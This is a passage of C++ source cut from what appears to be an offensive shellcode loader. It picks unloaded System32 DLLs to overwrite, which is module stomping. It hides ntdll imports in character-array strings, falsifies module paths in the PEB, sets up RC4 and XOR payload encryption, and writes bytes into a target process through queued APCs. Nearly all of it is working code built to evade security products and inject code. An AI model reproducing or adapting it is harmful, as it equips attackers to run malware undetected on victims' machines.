    BYTE* buffer = new BYTE[fileSize]; // Allocate buffer for the whole file
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Failed to read file
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }


    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(buffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // Not a valid PE file
    }

    if(dotnet) {
        // Verify it's a .NET assembly by checking the CLR header
        IMAGE_DATA_DIRECTORY* clrDataDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
        if (clrDataDirectory->VirtualAddress == 0 || clrDataDirectory->Size == 0) {
            // Not a .NET assembly
            CloseHandle(hFile);
            delete[] buffer;
            return FALSE;
        }
    }
    // Check if SizeOfImage is sufficient
    if (ntHeaders->OptionalHeader.SizeOfImage < requiredSize) {
        CloseHandle(hFile);
        return FALSE; // Image size is not sufficient
    }

    printf("[+] SizeOfImage: %lu\n", ntHeaders->OptionalHeader.SizeOfImage);

    BOOL textSectionFound = FALSE;
    IMAGE_SECTION_HEADER* sectionHeaders = NULL;
    if(!dotnet) {
        // Validate the .text section specifically
        sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));
        // BOOL textSectionFound = FALSE;
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
            if (strncmp((char*)section->Name, ".text", 5) == 0) {
                textSectionFound = TRUE;
                if (section->Misc.VirtualSize < requiredSize) {
                    CloseHandle(hFile);
                    delete[] buffer;
                    return FALSE; // .text section size is not sufficient
                }
                break;
            }
        }
    } else {
        textSectionFound = TRUE;
    }

    if(!dotnet) {
        printf("[+] .text section found: %s\n", textSectionFound ? "Yes" : "No");
        //print the size of the .text section in human readable format:
        printf("[+] .text section size: %lu bytes\n", sectionHeaders->Misc.VirtualSize);
    }

    if (!textSectionFound) {
        CloseHandle(hFile);
        delete[] buffer;
        return FALSE; // .text section not found
    }

    CloseHandle(hFile);
    delete[] buffer;
    return TRUE; // DLL is suitable
}


BOOL FindSuitableDLL(wchar_t* dllPath, SIZE_T bufferSize, DWORD requiredSize, BOOL bTxF, int dllOrder, bool dotnet = FALSE) {
    WIN32_FIND_DATAW findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    wchar_t systemDir[MAX_PATH] = { 0 };
    wchar_t searchPath[MAX_PATH] = { 0 };
    int foundCount = 0; // Count of suitable DLLs found

    // Get the system directory path
    if (!GetSystemDirectoryW(systemDir, _countof(systemDir))) {
        wprintf(L"Failed to get system directory. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // Construct the search path for DLLs in the system directory
    swprintf_s(searchPath, _countof(searchPath), L"%s\\*.dll", systemDir);

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to find first file. Error: %lu\n", GetLastError());
        return FALSE;
    }


    if(dotnet) {
        printf("\n [+] Looking for .NET assemblies\n");
    } else {
        printf("\n [+] Looking for suitable candidate DLLs\n");
    }
    do {
        // Skip directories
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;
        }

        wchar_t fullPath[MAX_PATH];
        swprintf_s(fullPath, _countof(fullPath), L"%s\\%s", systemDir, findData.cFileName);

        if (GetModuleHandleW(findData.cFileName) == NULL && ValidateDLLCharacteristics(fullPath, requiredSize, dotnet)) {
            foundCount++; // Increment the suitable DLL count
            if (foundCount == dllOrder) { // If the count matches the specified order
                // For simplicity, we're not using bTxF here, but you could adjust your logic
                // to use it for filtering or preparing DLLs for TxF based operations.
                // swprintf_s(fullPath, MAX_PATH, L"%s\\%s", systemDir, findData.cFileName);
                wcsncpy_s(dllPath, bufferSize, fullPath, _TRUNCATE);
                FindClose(hFind);
                // TODO:enable the function below if you want to see the statistics of the dll you are going to use:
                // PrintSectionDetails(fullPath);
                return TRUE; // Found the DLL in the specified order
            }
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
    return FALSE;
}



// Prototype for LdrLoadDll, which is not documented in Windows SDK headers.
typedef NTSTATUS (NTAPI *LdrLoadDll_t)(
    IN PWCHAR               PathToFile OPTIONAL,
    IN ULONG                Flags OPTIONAL,
    IN PUNICODE_STRING      ModuleFileName,
    OUT PHANDLE             ModuleHandle);

//////////////////////////////////// TxF: 
typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
    HANDLE ProcessHandle,
    PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended,
    ULONG StackZeroBits,
    PULONG StackReserved,
    PULONG StackCommit,
    PVOID StartAddress,
    PVOID StartParameter,
    PHANDLE ThreadHandle,
    PCLIENT_ID ClientID);

// deinfe pRtlExitUserThread:
typedef NTSTATUS (NTAPI *pRtlExitUserThread)(
    NTSTATUS ExitStatus
);


//define NtOpenProcess:
typedef NTSTATUS (NTAPI *NtOpenProcess_t)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

// Define the NT API function pointers
typedef LONG(__stdcall* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
// typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
//define NtUnMapViewOfSection:
typedef LONG(__stdcall* NtUnmapViewOfSection_t)(HANDLE, PVOID);
typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

typedef NTSTATUS (__stdcall* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T *NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection);


// Prototype for NtWaitForSingleObject
typedef NTSTATUS (__stdcall* NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

// TODO:
typedef NTSTATUS (__stdcall* NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
); 

NtOpenProcess_t NtOpenFuture;
LdrLoadDll_t LdrLoadDll;
NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtUnmapViewOfSection_t NtUnmapViewOfSection;
NtCreateTransaction_t NtCreateTransaction;
NtProtectVirtualMemory_t NtProtectVirtualMemory;
NtWaitForSingleObject_t MyNtWaitForSingleObject;
NtQueryInformationProcess_t MyNtQueryInformationProcess;


const wchar_t essentialLibW[] = { L'n', L't', L'd', L'l', L'l', 0 };
// Load NT functions
void LoadNtFunctions() {
    dynamic::resolve_imports();
    // Load Library is not a necessity here:
    HMODULE hNtdll = dynamic::loadFuture(essentialLibW);
    // HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");

    const char crucialLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    const char NtCreateFutureStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtFutureTranscationStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'r', 'a', 'n', 's', 'a', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtViewFutureStr[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtUnviewFutureStr[] = { 'N', 't', 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtProtectFutureMemoryStr[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    const char LdrLoadDllStr[] = { 'L', 'd', 'r', 'L', 'o', 'a', 'd', 'D', 'l', 'l', 0 };
    const char NtwaitForSingleObjectStr[] = { 'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    // for NtQueryInformationProcess
    const char NtQueryInformationProcessStr[] = { 'N', 't', 'Q', 'u', 'e', 'r', 'y', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
    // char for NtOpenProcess:
    const char NtOpenFutureStr[] = { 'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
    //we should output 

    NtOpenFuture = (NtOpenProcess_t) _import_crucial(NtOpenFutureStr, NtOpenProcess_t);
    NtCreateSection = (NtCreateSection_t) _import_crucial(NtCreateFutureStr, NtCreateSection_t);
    NtMapViewOfSection = (NtMapViewOfSection_t) _import_crucial(NtViewFutureStr, NtMapViewOfSection_t);
    NtUnmapViewOfSection = (NtUnmapViewOfSection_t) _import_crucial(NtUnviewFutureStr, NtUnmapViewOfSection_t);
    NtCreateTransaction = (NtCreateTransaction_t) _import_crucial(NtFutureTranscationStr, NtCreateTransaction_t);
    NtProtectVirtualMemory = (NtProtectVirtualMemory_t) _import_crucial(NtProtectFutureMemoryStr, NtProtectVirtualMemory_t);
    LdrLoadDll = (LdrLoadDll_t) _import_crucial(LdrLoadDllStr, LdrLoadDll_t);
    MyNtWaitForSingleObject = (NtWaitForSingleObject_t) _import_crucial(NtwaitForSingleObjectStr, NtWaitForSingleObject_t);
    MyNtQueryInformationProcess = (NtQueryInformationProcess_t) _import_crucial(NtQueryInformationProcessStr, NtQueryInformationProcess_t);
    // NtCreateSection = (NtCreateSection_t)dynamic::NotGetProcAddress(hNtdll, NtCreateFutureStr);
    // NtMapViewOfSection = (NtMapViewOfSection_t)dynamic::NotGetProcAddress(hNtdll, NtViewFutureStr);
    // NtCreateTransaction = (NtCreateTransaction_t)dynamic::NotGetProcAddress(hNtdll, NtFutureTranscationStr);
}


BOOL ChangeDllPath(HMODULE hModule, const wchar_t* newPath) {
    // Get the PEB address
    PROCESS_BASIC_INFORMATION pbi;
    ULONG len;
    NTSTATUS status = MyNtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len);
    if (status != 0) {
        wprintf(L"Failed to get PEB address. Status: %lx\n", status);
        return FALSE;
    }

    // Get the LDR data
    PPEB_LDR_DATA ldr = pbi.PebBaseAddress->Ldr;
    PLIST_ENTRY list = &ldr->InMemoryOrderModuleList;

    // Traverse the list to find the module
    for (PLIST_ENTRY entry = list->Flink; entry != list; entry = entry->Flink) {
        PLDR_DATA_TABLE_ENTRY_FREE dataTable = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);
        if (dataTable->DllBase == hModule) {
            // Modify the FullDllName
            size_t newPathLen = wcslen(newPath) * sizeof(wchar_t);
            memcpy(dataTable->FullDllName.Buffer, newPath, newPathLen);
            dataTable->FullDllName.Length = (USHORT)newPathLen;
            dataTable->FullDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);

            // Modify the BaseDllName if needed
            wchar_t* baseName = wcsrchr(newPath, L'\\');
            if (baseName) {
                baseName++;
                newPathLen = wcslen(baseName) * sizeof(wchar_t);
                memcpy(dataTable->BaseDllName.Buffer, baseName, newPathLen);
                dataTable->BaseDllName.Length = (USHORT)newPathLen;
                dataTable->BaseDllName.MaximumLength = (USHORT)newPathLen + sizeof(wchar_t);
            }
            return TRUE;
        }
    }

    wprintf(L"Module not found in PEB.\n");
    return FALSE;
}

/// Sys func 32 and 33: 

// Setup structs
typedef struct _CRYPT_BUFFER {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} CRYPT_BUFFER, * PCRYPT_BUFFER, DATA_KEY, * PDATA_KEY, CLEAR_DATA, * PCLEAR_DATA, CYPHER_DATA, * PCYPHER_DATA;

// Define the function pointers
typedef NTSTATUS(WINAPI* SystemFunction032_t)(PCRYPT_BUFFER pData, PDATA_KEY pKey);
typedef NTSTATUS(WINAPI* SystemFunction033_t)(PCRYPT_BUFFER pData, PDATA_KEY pKey);

SystemFunction032_t sysfunc32 = NULL;
SystemFunction033_t SystemFunction033 = NULL;

static char _key[] = "BOAZ is the best!";

static CRYPT_BUFFER pData = { 0 };
static DATA_KEY pKey = { 0 };

void initialize_keys() {
    pKey.Buffer = (PVOID)(_key);
    pKey.Length = sizeof(_key);
    pKey.MaximumLength = sizeof(_key);
}

void initialize_data(char* dllEntryPoint1, DWORD dll_len) {
    pData.Buffer = (char*)(dllEntryPoint1);
    pData.Length = dll_len;
    pData.MaximumLength = dll_len;
}

char key[16];
unsigned int r = 0;

void sUrprise(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	int b = 0;
	j = 0;
	for (int i = 0; i < data_len; i++) {
			if (j == key_len - 1) j = 0;
			b++;
			data[i] = data[i] ^ key[j];
			j++;
	}
}


//// Worker call back functions: 

typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID address;                       // PVOID BaseAddress - rdx
    PVOID buffer;                        // PVOID Buffer - r8
    SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
    ULONG bytesWritten;
} NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;

extern "C" {
    VOID CALLBACK IWillBeBack(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
}
/////////////////////////////////////// APC Write:

#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF
// Declaration of undocumented functions and structures

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;




#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED
#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // don't update synchronization objects
#endif

// typedef ULONG (NTAPI *NtQueueApcThread_t)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
typedef NTSTATUS (NTAPI *NtQueueApcThreadEx2_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine,
    PVOID SystemArgument1 OPTIONAL,
    PVOID SystemArgument2 OPTIONAL,
    PVOID SystemArgument3 OPTIONAL
);



typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);


//
// This is used as SystemArgument3 if QueueUserAPC
// was used to queue the APC.
//
typedef union _APC_ACTIVATION_CTX { 
    ULONG_PTR Value;
    HANDLE hActCtx;
} APC_ACTIVATION_CTX;

//deinfe RtlDispatchAPC:
typedef NTSTATUS (NTAPI *RtlDispatchAPC_t)(
    PAPCFUNC pfnAPC,
    ULONG_PTR dwData,
    APC_ACTIVATION_CTX ApcActivationContext
);


// Function to write memory using APCs with an option to choose the thread creation method
DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait) {
    HANDLE hThread = NULL;
    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);

    const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    // const char NtQueueFutureApcStr[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
    const char NtFillFutureMemoryStr[] = { 'R', 't', 'l', 'F', 'i', 'l', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    // NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcStr);
    NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
    void *pRtlFillMemory = (void*)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtFillFutureMemoryStr);


    // TODO, Change state: 
    pNtCreateThreadStateChange NtCreateThreadStateChange = (pNtCreateThreadStateChange)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtCreateThreadStateChange"); 
    pNtChangeThreadState NtChangeThreadState = (pNtChangeThreadState)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtChangeThreadState");
    
    pNtCreateProcessStateChange NtCreateProcessStateChange = (pNtCreateProcessStateChange)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtCreateProcessStateChange");
    pNtChangeProcessState NtChangeProcessState = (pNtChangeProcessState)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtChangeProcessState");



    if (!pNtQueueApcThread || !pRtlFillMemory) {
        printf("[-] Failed to locate required functions.\n");
        return 1;
    }

            NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
            if (!pNtCreateThreadEx) {
                printf("[-] Failed to locate NtCreateThreadEx.\n");
                return 1;
            }

    if(!bUseCreateThreadpoolWait){
        if (useRtlCreateUserThread) {
            pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
            if (!RtlCreateUserThread) {
                printf("[-] Failed to locate RtlCreateUserThread.\n");
                return 1;
            }

            CLIENT_ID ClientID;
            NTSTATUS ntStatus = RtlCreateUserThread(
                hProcess,
                NULL, // SecurityDescriptor
                TRUE, // CreateSuspended - not directly supported, handle suspension separately
                0, // StackZeroBits
                NULL, // StackReserved
                NULL, // StackCommit
                (PVOID)(ULONG_PTR)ExitThread, // StartAddress, using ExitThread as a placeholder
                NULL, // StartParameter
                &hThread,
                &ClientID);

            if (ntStatus != STATUS_SUCCESS) {
                printf("[-] RtlCreateUserThread failed: %x\n", ntStatus);
                return 1;
            }
            printf("[+] RtlCreateUserThread succeeded\n");
            // Immediately suspend the thread to mimic the NT_CREATE_THREAD_EX_SUSPENDED flag behavior
            // SuspendThread(hThread);
        } else {


            ULONG status = pNtCreateThreadEx(
                &hThread,
                NT_CREATE_THREAD_EX_ALL_ACCESS,
                NULL,
                hProcess,
                (PVOID)(ULONG_PTR)ExitThread,
                NULL,
                NT_CREATE_THREAD_EX_SUSPENDED,
                0,
                0,
                0,
                NULL);

            if (status != 0) {
                printf("[-] Failed to create remote thread: %lu\n", status);
                return 1;
            }
            printf("[+] NtCreateThreadEx succeeded\n");
        }
    } else {
        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
        if(!hThread) {
            printf("[-] Failed to open thread: %lu\n", GetLastError());
            return 1;
        }
        // ULONG status = pNtCreateThreadEx(
        //     &hThread,
        //     NT_CREATE_THREAD_EX_ALL_ACCESS,
        //     NULL,
        //     hProcess,
        //     (PVOID)(ULONG_PTR)ExitThread,
        //     NULL,
        //     NT_CREATE_THREAD_EX_SUSPENDED,
        //     0,
        //     0,
        //     0,
        //     NULL);

        // if (status != 0) {
        //     printf("[-] Failed to create remote thread: %lu\n", status);
        //     return 1;
        // }
        // printf("[+] NtCreateThreadEx succeeded\n");
    }


    // TODO: Change state:
    // HANDLE ThreadStateChangeHandle = NULL;
    // HANDLE duplicateThreadHandle = NULL;

    // BOOL success = DuplicateHandle(
    //     GetCurrentProcess(), // Source process handle
    //     hThread, // Source handle to duplicate
    //     GetCurrentProcess(), // Target process handle
    //     &duplicateThreadHandle, // Pointer to the duplicate handle
    //     THREAD_ALL_ACCESS, // Desired access (0 uses the same access as the source handle)
    //     FALSE, // Inheritable handle option
    //     0 // Options
    // );

    // NTSTATUS status = NtCreateThreadStateChange(
    //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
    //     MAXIMUM_ALLOWED,            // Define the access you need
    //     NULL,                      // ObjectAttributes, typically NULL for basic usage
    //     duplicateThreadHandle,              // Handle to the thread you're working with
    //     0                          // Reserved, likely 0 for most uses
    // );
    // if (status != STATUS_SUCCESS) {
    //     printf("[-] Failed to create thread state change: %x\n", status);
    //     return 1;
    // } else {
    //     printf("[+] Thread state change created\n");
    // }   

    // status = NtChangeThreadState(ThreadStateChangeHandle, duplicateThreadHandle, 1, NULL, 0, 0);
    // if (status != STATUS_SUCCESS) {
    //     printf("[-] Failed to sus thread: %x\n", status);
    //     // return 1;
    // } else {
    //     printf("[+] Thread suspended\n");
    // };



    QUEUE_USER_APC_FLAGS apcFlags = bUseCreateThreadpoolWait ? QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC : QUEUE_USER_APC_FLAGS_NONE;

    for (DWORD i = 0; i < dwLength; i++) {
        BYTE byte = pData[i];

        // Print only for the first and last byte
        if (i == 0 || i == dwLength - 1) {
            if(i == 0) {
                printf("[+] Queue Apc Ex2 Writing start byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
            } else {
                printf("[+] Queue Apc Ex2 Writing end byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
            }
        }
        // no Ex:
        // ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
        // if (result != STATUS_SUCCESS) {
        //     printf("[-] Failed to queue APC. NTSTATUS: 0x%X\n", result);
        //     TerminateThread(hThread, 0);
        //     CloseHandle(hThread);
        //     return 1;
        // }
        // Ex:

        //pRtlFillMemory can be replaced with memset or memmove
        NTSTATUS result = pNtQueueApcThread(
        hThread, // ThreadHandle remains the same
        NULL, // UserApcReserveHandle is not used in the original call, so pass NULL
        apcFlags, // Whatever you like 
        pRtlFillMemory, // ApcRoutine remains the same
        (PVOID)(pAddress + i), // SystemArgument1: Memory address to fill, offset by i, as before
        (PVOID)1, // SystemArgument2: The size argument for RtlFillMemory, as before
        (PVOID)(ULONG_PTR)byte // SystemArgument3: The byte value to fill, cast properly, as before
        );
        if (result != STATUS_SUCCESS) {
            printf("[-] Failed to queue APC Ex2. NTSTATUS: 0x%X\n", result);
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        } else {
            // printf("[+] APC Ex2 queued successfully\n");
        }

    }

    // Resume the thread to execute queued APCs and then wait for completion
    if(!bUseCreateThreadpoolWait){


        // TODO, Change state: 
        /// print the address of above functions: 
        // printf("[+] NtCreateThreadStateChange: %p\n", NtCreateThreadStateChange);
        // printf("[+] NtChangeThreadState: %p\n", NtChangeThreadState);
        // printf("[+] NtCreateProcessStateChange: %p\n", NtCreateProcessStateChange);
        // printf("[+] NtChangeProcessState: %p\n", NtChangeProcessState);

        // HANDLE ThreadStateChangeHandle = NULL;
        // NTSTATUS status = NtCreateThreadStateChange(
        //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
        //     MAXIMUM_ALLOWED,            // Define the access you need
        //     NULL,                      // ObjectAttributes, typically NULL for basic usage
        //     hThread,              // Handle to the thread you're working with
        //     0                          // Reserved, likely 0 for most uses
        // );
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to create thread state change: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Thread state change created\n");
        // }   
        
        // NTSTATUS status = NtCreateProcessStateChange(
        //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
        //     MAXIMUM_ALLOWED,            // Define the access you need
        //     NULL,                      // ObjectAttributes, typically NULL for basic usage
        //     hProcess,              // Handle to the thread you're working with
        //     0                          // Reserved, likely 0 for most uses
        // );
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to create process state change: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Process state change created\n");
        // }
        // status = NtChangeThreadState(ThreadStateChangeHandle, duplicateThreadHandle, 2, NULL, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume thread: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Thread resumed\n");
        // };

        // print the ThreadStateChangeHandle->ThreadSuspendCount
        // getchar();
        // status = NtChangeThreadState(ThreadStateChangeHandle, hThread, 2, 0, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume thread: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Thread resumed\n");
        // };

        // status = NtChangeProcessState(ThreadStateChangeHandle, hProcess, 0, NULL, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume process: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Process resumed\n");
        // };

        // status = NtChangeProcessState(ThreadStateChangeHandle, hProcess, 1, NULL, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume process: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Process resumed\n");
        // };

        DWORD count = ResumeThread(hThread);
        printf("[+] Resuming thread %lu to write bytes\n", count);
        WaitForSingleObject(hThread, INFINITE);
        printf("[+] press any key to continue\n");
        getchar();
    } else {
        // Create a thread pool wait object
        PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)pRtlFillMemory, NULL, NULL);
        // PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)ExitThread, NULL, NULL);

        if (ptpWait == NULL) {
            printf("[-] Failed to create thread pool wait object: %lu\n", GetLastError());
            return 1;
        }

        // Associate the wait object with the thread pool
        SetThreadpoolWait(ptpWait, event, NULL);
        printf("[+] Thread pool wait object created\n");
        // WaitForSingleObject(event, INFINITE);
        WaitForThreadpoolWaitCallbacks(ptpWait, FALSE);
        // CreateThreadpoolWait
        // SetThreadpoolWait
        // WaitForThreadpoolWaitCallbacks
        // CloseThreadpoolWait
    }   

    printf("[+] APC write completed\n");

    if(!bUseCreateThreadpoolWait){
        /// The code below is not necessary, however, provided an "insurance".
